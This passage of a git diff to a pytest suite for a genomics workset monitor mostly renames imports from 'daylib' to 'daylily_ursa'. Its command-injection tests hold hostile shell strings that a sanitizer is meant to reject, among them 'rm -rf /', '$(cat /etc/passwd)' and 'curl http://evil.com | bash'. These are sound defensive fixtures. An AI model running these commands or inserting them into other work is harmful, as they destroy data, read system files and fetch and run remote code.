     def test_execution_context_includes_customer_id(self):
         """Test that ExecutionContext can store customer_id for cost attribution."""
-        from daylib.workset_monitor import ExecutionContext
+        from daylily_ursa.workset_monitor import ExecutionContext
 
         ctx = ExecutionContext(
             cluster_name="test-cluster",
@@ -2303,7 +2303,7 @@ class TestExecutionContextCustomerId:
 
     def test_execution_context_to_dict_includes_customer_id(self):
         """Test that customer_id is serialized in to_dict()."""
-        from daylib.workset_monitor import ExecutionContext
+        from daylily_ursa.workset_monitor import ExecutionContext
 
         ctx = ExecutionContext(
             cluster_name="test-cluster",
@@ -2318,7 +2318,7 @@ class TestExecutionContextCustomerId:
 
     def test_execution_context_from_dict_includes_customer_id(self):
         """Test that customer_id is deserialized in from_dict()."""
-        from daylib.workset_monitor import ExecutionContext
+        from daylily_ursa.workset_monitor import ExecutionContext
 
         data = {
             "cluster_name": "test-cluster",
@@ -2333,7 +2333,7 @@ class TestExecutionContextCustomerId:
 
     def test_execution_context_customer_id_optional(self):
         """Test that customer_id defaults to None when not provided."""
-        from daylib.workset_monitor import ExecutionContext
+        from daylily_ursa.workset_monitor import ExecutionContext
 
         ctx = ExecutionContext(
             cluster_name="test-cluster",
@@ -2356,7 +2356,7 @@ class TestExecutionContextCustomerId:
 
     def test_execution_context_roundtrip_with_customer_id(self):
         """Test that customer_id survives to_dict/from_dict roundtrip."""
-        from daylib.workset_monitor import ExecutionContext
+        from daylily_ursa.workset_monitor import ExecutionContext
 
         original = ExecutionContext(
             cluster_name="roundtrip-cluster",
@@ -2446,7 +2446,7 @@ class TestCommandInjectionPrevention:
     @pytest.fixture
     def monitor(self):
         """Create a WorksetMonitor instance for testing sanitization methods."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
         return monitor
@@ -2478,7 +2478,7 @@ class TestCommandInjectionPrevention:
 
     def test_sanitize_shell_args_rejects_semicolon(self, monitor):
         """Test that semicolon (command chaining) is rejected."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         with pytest.raises(MonitorError) as exc_info:
             monitor._sanitize_shell_args("wgs; rm -rf /", "test args")
@@ -2487,7 +2487,7 @@ class TestCommandInjectionPrevention:
 
     def test_sanitize_shell_args_rejects_pipe(self, monitor):
         """Test that pipe (command chaining) is rejected."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         with pytest.raises(MonitorError) as exc_info:
             monitor._sanitize_shell_args("wgs | tee /etc/passwd", "test args")
@@ -2496,7 +2496,7 @@ class TestCommandInjectionPrevention:
 
     def test_sanitize_shell_args_rejects_ampersand(self, monitor):
         """Test that ampersand (background/chaining) is rejected."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         with pytest.raises(MonitorError) as exc_info:
             monitor._sanitize_shell_args("wgs & malicious_cmd", "test args")
@@ -2505,7 +2505,7 @@ class TestCommandInjectionPrevention:
 
     def test_sanitize_shell_args_rejects_dollar_sign(self, monitor):
         """Test that dollar sign (variable expansion) is rejected."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         with pytest.raises(MonitorError) as exc_info:
             monitor._sanitize_shell_args("wgs $HOME", "test args")
@@ -2514,7 +2514,7 @@ class TestCommandInjectionPrevention:
 
     def test_sanitize_shell_args_rejects_backtick(self, monitor):
         """Test that backtick (command substitution) is rejected."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         with pytest.raises(MonitorError) as exc_info:
             monitor._sanitize_shell_args("wgs `whoami`", "test args")
@@ -2523,7 +2523,7 @@ class TestCommandInjectionPrevention:
 
     def test_sanitize_shell_args_rejects_dollar_paren(self, monitor):
         """Test that $() command substitution is rejected."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         with pytest.raises(MonitorError) as exc_info:
             monitor._sanitize_shell_args("wgs $(whoami)", "test args")
@@ -2531,7 +2531,7 @@ class TestCommandInjectionPrevention:
 
     def test_sanitize_shell_args_rejects_dollar_brace(self, monitor):
         """Test that ${} variable expansion is rejected."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         with pytest.raises(MonitorError) as exc_info:
             monitor._sanitize_shell_args("wgs ${PATH}", "test args")
@@ -2539,7 +2539,7 @@ class TestCommandInjectionPrevention:
 
     def test_sanitize_shell_args_rejects_newline(self, monitor):
         """Test that newline (command injection) is rejected."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         with pytest.raises(MonitorError) as exc_info:
             monitor._sanitize_shell_args("wgs\nrm -rf /", "test args")
@@ -2547,7 +2547,7 @@ class TestCommandInjectionPrevention:
 
     def test_sanitize_shell_args_rejects_carriage_return(self, monitor):
         """Test that carriage return is rejected."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         with pytest.raises(MonitorError) as exc_info:
             monitor._sanitize_shell_args("wgs\rrm -rf /", "test args")
@@ -2555,7 +2555,7 @@ class TestCommandInjectionPrevention:
 
     def test_sanitize_shell_args_rejects_redirect_out(self, monitor):
         """Test that output redirect is rejected."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         with pytest.raises(MonitorError) as exc_info:
             monitor._sanitize_shell_args("wgs > /etc/passwd", "test args")
@@ -2564,7 +2564,7 @@ class TestCommandInjectionPrevention:
 
     def test_sanitize_shell_args_rejects_redirect_in(self, monitor):
         """Test that input redirect is rejected."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         with pytest.raises(MonitorError) as exc_info:
             monitor._sanitize_shell_args("wgs < /etc/passwd", "test args")
@@ -2573,7 +2573,7 @@ class TestCommandInjectionPrevention:
 
     def test_sanitize_shell_args_rejects_exclamation(self, monitor):
         """Test that history expansion (!) is rejected."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         with pytest.raises(MonitorError) as exc_info:
             monitor._sanitize_shell_args("wgs !!", "test args")
@@ -2582,7 +2582,7 @@ class TestCommandInjectionPrevention:
 
     def test_sanitize_shell_args_invalid_quoting(self, monitor):
         """Test that unbalanced quotes raise an error."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         with pytest.raises(MonitorError) as exc_info:
             monitor._sanitize_shell_args('wgs "unclosed', "test args")
@@ -2608,7 +2608,7 @@ class TestCommandInjectionPrevention:
 
     def test_sanitize_clone_args_rejects_injection(self, monitor):
         """Test that injection attempts in clone_args are rejected."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         # Attempt to inject a command after clone
         with pytest.raises(MonitorError):
@@ -2616,7 +2616,7 @@ class TestCommandInjectionPrevention:
 
     def test_sanitize_clone_args_rejects_subshell(self, monitor):
         """Test that subshell attempts in clone_args are rejected."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         with pytest.raises(MonitorError):
             monitor._sanitize_clone_args("-d $(cat /etc/passwd)")
@@ -2646,21 +2646,21 @@ class TestCommandInjectionPrevention:
 
     def test_sanitize_run_suffix_rejects_command_chaining(self, monitor):
         """Test that command chaining in run_suffix is rejected."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         with pytest.raises(MonitorError):
             monitor._sanitize_run_suffix("wgs -p; curl http://evil.com | bash")
 
     def test_sanitize_run_suffix_rejects_variable_expansion(self, monitor):
         """Test that variable expansion in run_suffix is rejected."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         with pytest.raises(MonitorError):
             monitor._sanitize_run_suffix("wgs -p $MALICIOUS")
 
     def test_sanitize_run_suffix_rejects_backtick_injection(self, monitor):
         """Test that backtick injection in run_suffix is rejected."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         with pytest.raises(MonitorError):
             monitor._sanitize_run_suffix("wgs `wget http://evil.com/payload`")
@@ -2671,7 +2671,7 @@ class TestCommandInjectionPrevention:
 
     def test_format_clone_args_sanitizes_output(self, monitor):
         """Test that _format_clone_args sanitizes the formatted output."""
-        from daylib.workset_monitor import Workset
+        from daylily_ursa.workset_monitor import Workset
 
         workset = MagicMock(spec=Workset)
         workset.name = "test-workset"
@@ -2684,7 +2684,7 @@ class TestCommandInjectionPrevention:
 
     def test_format_clone_args_rejects_malicious_workset_name(self, monitor):
         """Test that malicious patterns in workset name are sanitized."""
-        from daylib.workset_monitor import Workset
+        from daylily_ursa.workset_monitor import Workset
 
         workset = MagicMock(spec=Workset)
         # This would be sanitized by _sanitize_name before being formatted
@@ -2699,7 +2699,7 @@ class TestCommandInjectionPrevention:
 
     def test_format_clone_args_empty_returns_empty(self, monitor):
         """Test that empty clone_args returns empty string."""
-        from daylib.workset_monitor import Workset
+        from daylily_ursa.workset_monitor import Workset
 
         workset = MagicMock(spec=Workset)
         workset.name = "test-workset"
@@ -2716,7 +2716,7 @@ class TestCommandInjectionPrevention:
         """Test that null byte injection patterns are handled."""
         # Null bytes in the middle of args - shlex should handle this
         # but if it contains a dangerous pattern, we reject first
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         # Combine null with semicolon
         with pytest.raises(MonitorError):
@@ -2724,14 +2724,14 @@ class TestCommandInjectionPrevention:
 
     def test_sanitize_rejects_double_ampersand(self, monitor):
         """Test that && (logical AND) is rejected."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         with pytest.raises(MonitorError):
             monitor._sanitize_shell_args("wgs && rm -rf /", "test")
 
     def test_sanitize_rejects_double_pipe(self, monitor):
         """Test that || (logical OR) is rejected."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         with pytest.raises(MonitorError):
             monitor._sanitize_shell_args("wgs || rm -rf /", "test")
@@ -2762,7 +2762,7 @@ class TestCommandInjectionPrevention:
 
     def test_sanitize_context_appears_in_error_message(self, monitor):
         """Test that the context string appears in error messages."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         with pytest.raises(MonitorError) as exc_info:
             monitor._sanitize_shell_args("bad; command", "my custom context")
@@ -2776,7 +2776,7 @@ class TestCostReportIntegration:
     def monitor_with_state_db(self, tmp_path):
         """Create a WorksetMonitor with mocked state_db."""
         from unittest.mock import MagicMock, patch
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         mock_config = MagicMock()
         mock_config.aws.region = "us-west-2"
@@ -2793,7 +2793,7 @@ class TestCostReportIntegration:
         mock_state_db.update_storage_metrics.return_value = True
         mock_state_db.update_performance_metrics.return_value = True
 
-        with patch("daylib.workset_monitor.boto3.client"):
+        with patch("daylily_ursa.workset_monitor.boto3.client"):
             monitor = WorksetMonitor(config=mock_config)
             monitor.state_db = mock_state_db
             yield monitor, mock_state_db
@@ -2822,7 +2822,7 @@ class TestCostReportIntegration:
 
         with patch.object(monitor, "_get_s3_directory_size", return_value=1073741824):
             with patch.object(monitor, "_collect_s3_file_metrics"):
-                with patch("daylib.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
+                with patch("daylily_ursa.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
                     mock_fetcher = MagicMock()
                     mock_fetcher.fetch_performance_metrics_from_s3.return_value = mock_perf_metrics
                     mock_fetcher_class.return_value = mock_fetcher
@@ -2859,7 +2859,7 @@ class TestCostReportIntegration:
 
         with patch.object(monitor, "_get_s3_directory_size", return_value=1000):
             with patch.object(monitor, "_collect_s3_file_metrics"):
-                with patch("daylib.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
+                with patch("daylily_ursa.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
                     mock_fetcher = MagicMock()
                     mock_fetcher.fetch_performance_metrics_from_s3.return_value = mock_perf_metrics
                     mock_fetcher_class.return_value = mock_fetcher
@@ -2880,7 +2880,7 @@ class TestStorageMetricsIntegration:
     def monitor_with_state_db(self, tmp_path):
         """Create a WorksetMonitor with mocked state_db."""
         from unittest.mock import MagicMock, patch
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         mock_config = MagicMock()
         mock_config.aws.region = "us-west-2"
@@ -2897,7 +2897,7 @@ class TestStorageMetricsIntegration:
         mock_state_db.update_storage_metrics.return_value = True
         mock_state_db.update_performance_metrics.return_value = True
 
-        with patch("daylib.workset_monitor.boto3.client"):
+        with patch("daylily_ursa.workset_monitor.boto3.client"):
             monitor = WorksetMonitor(config=mock_config)
             monitor.state_db = mock_state_db
             yield monitor, mock_state_db
@@ -2916,7 +2916,7 @@ class TestStorageMetricsIntegration:
 
         with patch.object(monitor, "_get_s3_directory_size", return_value=storage_bytes):
             with patch.object(monitor, "_collect_s3_file_metrics"):
-                with patch("daylib.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
+                with patch("daylily_ursa.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
                     mock_fetcher = MagicMock()
                     mock_fetcher.fetch_performance_metrics_from_s3.return_value = {}
                     mock_fetcher_class.return_value = mock_fetcher
@@ -2944,7 +2944,7 @@ class TestStorageMetricsIntegration:
 
         with patch.object(monitor, "_get_s3_directory_size", return_value=0):
             with patch.object(monitor, "_collect_s3_file_metrics"):
-                with patch("daylib.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
+                with patch("daylily_ursa.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
                     mock_fetcher = MagicMock()
                     mock_fetcher.fetch_performance_metrics_from_s3.return_value = {}
                     mock_fetcher_class.return_value = mock_fetcher
@@ -2969,7 +2969,7 @@ class TestStorageMetricsIntegration:
 
         with patch.object(monitor, "_get_s3_directory_size", return_value=1000):
             with patch.object(monitor, "_collect_s3_file_metrics"):
-                with patch("daylib.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
+                with patch("daylily_ursa.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
                     mock_fetcher = MagicMock()
                     mock_fetcher.fetch_performance_metrics_from_s3.return_value = {}
                     mock_fetcher_class.return_value = mock_fetcher
@@ -3004,7 +3004,7 @@ class TestStorageMetricsIntegration:
 
         with patch.object(monitor, "_get_s3_directory_size", return_value=storage_bytes):
             with patch.object(monitor, "_collect_s3_file_metrics"):
-                with patch("daylib.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
+                with patch("daylily_ursa.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
                     mock_fetcher = MagicMock()
                     mock_fetcher.fetch_performance_metrics_from_s3.return_value = mock_perf_metrics
                     mock_fetcher_class.return_value = mock_fetcher
@@ -3073,10 +3073,10 @@ class TestSchedulerIntegration:
     @pytest.fixture
     def monitor_with_scheduler(self, mock_config, mock_scheduler):
         """Create monitor with scheduler."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
-        with patch("daylib.workset_monitor.boto3"):
-            with patch("daylib.workset_monitor.RegionAwareS3Client"):
+        with patch("daylily_ursa.workset_monitor.boto3"):
+            with patch("daylily_ursa.workset_monitor.RegionAwareS3Client"):
                 monitor = WorksetMonitor(
                     mock_config,
                     scheduler=mock_scheduler,
@@ -3085,12 +3085,12 @@ class TestSchedulerIntegration:
 
     def test_monitor_accepts_scheduler_parameter(self, mock_config):
         """Test that WorksetMonitor accepts optional scheduler parameter."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         mock_scheduler = MagicMock()
 
-        with patch("daylib.workset_monitor.boto3"):
-            with patch("daylib.workset_monitor.RegionAwareS3Client"):
+        with patch("daylily_ursa.workset_monitor.boto3"):
+            with patch("daylily_ursa.workset_monitor.RegionAwareS3Client"):
                 monitor = WorksetMonitor(
                     mock_config,
                     scheduler=mock_scheduler,
@@ -3100,10 +3100,10 @@ class TestSchedulerIntegration:
 
     def test_monitor_without_scheduler(self, mock_config):
         """Test that WorksetMonitor works without scheduler."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
-        with patch("daylib.workset_monitor.boto3"):
-            with patch("daylib.workset_monitor.RegionAwareS3Client"):
+        with patch("daylily_ursa.workset_monitor.boto3"):
+            with patch("daylily_ursa.workset_monitor.RegionAwareS3Client"):
                 monitor = WorksetMonitor(mock_config)
 
         assert monitor.scheduler is None
@@ -3128,10 +3128,10 @@ class TestSchedulerIntegration:
 
     def test_register_cluster_capacity_without_scheduler(self, mock_config):
         """Test register_cluster_capacity is no-op without scheduler."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
-        with patch("daylib.workset_monitor.boto3"):
-            with patch("daylib.workset_monitor.RegionAwareS3Client"):
+        with patch("daylily_ursa.workset_monitor.boto3"):
+            with patch("daylily_ursa.workset_monitor.RegionAwareS3Client"):
                 monitor = WorksetMonitor(mock_config)
 
         # Should not raise
@@ -3175,7 +3175,7 @@ class TestSchedulerIntegration:
 
     def test_get_prioritized_worksets_with_scheduler(self, monitor_with_scheduler):
         """Test _get_prioritized_worksets uses scheduler ordering."""
-        from daylib.workset_monitor import Workset
+        from daylily_ursa.workset_monitor import Workset
 
         monitor, mock_scheduler = monitor_with_scheduler
 
@@ -3203,10 +3203,10 @@ class TestSchedulerIntegration:
 
     def test_get_prioritized_worksets_without_scheduler(self, mock_config):
         """Test _get_prioritized_worksets preserves order without scheduler."""
-        from daylib.workset_monitor import WorksetMonitor, Workset
+        from daylily_ursa.workset_monitor import WorksetMonitor, Workset
 
-        with patch("daylib.workset_monitor.boto3"):
-            with patch("daylib.workset_monitor.RegionAwareS3Client"):
+        with patch("daylily_ursa.workset_monitor.boto3"):
+            with patch("daylily_ursa.workset_monitor.RegionAwareS3Client"):
                 monitor = WorksetMonitor(mock_config)
 
         worksets = [
@@ -3220,12 +3220,12 @@ class TestSchedulerIntegration:
 
     def test_handle_workset_async_updates_scheduler_on_completion(self, mock_config):
         """Test _handle_workset_async updates scheduler after workset completes."""
-        from daylib.workset_monitor import WorksetMonitor, Workset
+        from daylily_ursa.workset_monitor import WorksetMonitor, Workset
 
         mock_scheduler = MagicMock()
 
-        with patch("daylib.workset_monitor.boto3"):
-            with patch("daylib.workset_monitor.RegionAwareS3Client"):
+        with patch("daylily_ursa.workset_monitor.boto3"):
+            with patch("daylily_ursa.workset_monitor.RegionAwareS3Client"):
                 monitor = WorksetMonitor(
                     mock_config,
                     scheduler=mock_scheduler,
@@ -3281,13 +3281,13 @@ class TestConcurrentProcessorIntegration:
     @pytest.fixture
     def monitor_with_all_components(self, mock_config):
         """Create monitor with state_db and scheduler."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         mock_state_db = MagicMock()
         mock_scheduler = MagicMock()
 
-        with patch("daylib.workset_monitor.boto3"):
-            with patch("daylib.workset_monitor.RegionAwareS3Client"):
+        with patch("daylily_ursa.workset_monitor.boto3"):
+            with patch("daylily_ursa.workset_monitor.RegionAwareS3Client"):
                 monitor = WorksetMonitor(
                     mock_config,
                     state_db=mock_state_db,
@@ -3297,7 +3297,7 @@ class TestConcurrentProcessorIntegration:
 
     def test_use_concurrent_processor_config_option(self):
         """Test MonitorOptions has use_concurrent_processor flag."""
-        from daylib.workset_monitor import MonitorOptions
+        from daylily_ursa.workset_monitor import MonitorOptions
 
         options = MonitorOptions(prefix="worksets/")
         assert hasattr(options, "use_concurrent_processor")
@@ -3375,12 +3375,12 @@ class TestConcurrentProcessorIntegration:
 
     def test_run_with_concurrent_processor_requires_scheduler(self, mock_config):
         """Test run_with_concurrent_processor raises without scheduler."""
-        from daylib.workset_monitor import WorksetMonitor, MonitorError
+        from daylily_ursa.workset_monitor import WorksetMonitor, MonitorError
 
         mock_state_db = MagicMock()
 
-        with patch("daylib.workset_monitor.boto3"):
-            with patch("daylib.workset_monitor.RegionAwareS3Client"):
+        with patch("daylily_ursa.workset_monitor.boto3"):
+            with patch("daylily_ursa.workset_monitor.RegionAwareS3Client"):
                 monitor = WorksetMonitor(
                     mock_config,
                     state_db=mock_state_db,
@@ -3392,12 +3392,12 @@ class TestConcurrentProcessorIntegration:
 
     def test_run_with_concurrent_processor_requires_state_db(self, mock_config):
         """Test run_with_concurrent_processor raises without state_db."""
-        from daylib.workset_monitor import WorksetMonitor, MonitorError
+        from daylily_ursa.workset_monitor import WorksetMonitor, MonitorError
 
         mock_scheduler = MagicMock()
 
-        with patch("daylib.workset_monitor.boto3"):
-            with patch("daylib.workset_monitor.RegionAwareS3Client"):
+        with patch("daylily_ursa.workset_monitor.boto3"):
+            with patch("daylily_ursa.workset_monitor.RegionAwareS3Client"):
                 monitor = WorksetMonitor(
                     mock_config,
                     state_db=None,
@@ -3411,7 +3411,7 @@ class TestConcurrentProcessorIntegration:
         """Test run_with_concurrent_processor creates and starts processor."""
         monitor, mock_state_db, mock_scheduler = monitor_with_all_components
 
-        with patch("daylib.workset_concurrent_processor.ConcurrentWorksetProcessor") as mock_processor_class:
+        with patch("daylily_ursa.workset_concurrent_processor.ConcurrentWorksetProcessor") as mock_processor_class:
             mock_processor = MagicMock()
             # Make start() raise to exit immediately
             mock_processor.start.side_effect = KeyboardInterrupt()
@@ -3435,7 +3435,7 @@ class TestConcurrentProcessorIntegration:
         """Test ConcurrentWorksetProcessor config matches monitor config."""
         monitor, _, _ = monitor_with_all_components
 
-        with patch("daylib.workset_concurrent_processor.ConcurrentWorksetProcessor") as mock_processor_class:
+        with patch("daylily_ursa.workset_concurrent_processor.ConcurrentWorksetProcessor") as mock_processor_class:
             mock_processor = MagicMock()
             mock_processor.start.side_effect = KeyboardInterrupt()
             mock_processor_class.return_value = mock_processor
@@ -3563,7 +3563,7 @@ class TestWorksetRetrySemantics:
 
     def test_update_metadata_method_merges_fields(self):
         """Test that update_metadata properly merges with existing metadata."""
-        from daylib.workset_state_db import WorksetStateDB
+        from daylily_ursa.workset_state_db import WorksetStateDB
 
         state_db = WorksetStateDB.__new__(WorksetStateDB)
         state_db.backend = MagicMock()
@@ -3589,7 +3589,7 @@ class TestWorksetRetrySemantics:
 
     def test_retry_endpoint_ownership_check(self):
         """Test that retry endpoint verifies workset ownership."""
-        from daylib.routes.dependencies import verify_workset_ownership
+        from daylily_ursa.routes.dependencies import verify_workset_ownership
 
         # Workset belongs to customer-a
         workset = {"workset_id": "ws-1", "customer_id": "customer-a"}
